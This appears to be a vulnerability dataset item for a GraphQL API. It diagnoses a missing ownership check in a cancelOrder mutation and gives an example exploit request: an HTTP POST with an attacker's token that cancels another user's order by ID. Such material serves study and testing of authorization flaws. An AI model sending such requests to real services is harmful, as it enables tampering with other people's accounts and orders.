diagnosis: GraphQL mutation to cancel an order fetches the order by ID and mutates its status. It does not enforce that the authenticated user is the one who placed the order.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"query": "mutation { cancelOrder(orderId: 1024) { id status } }"}
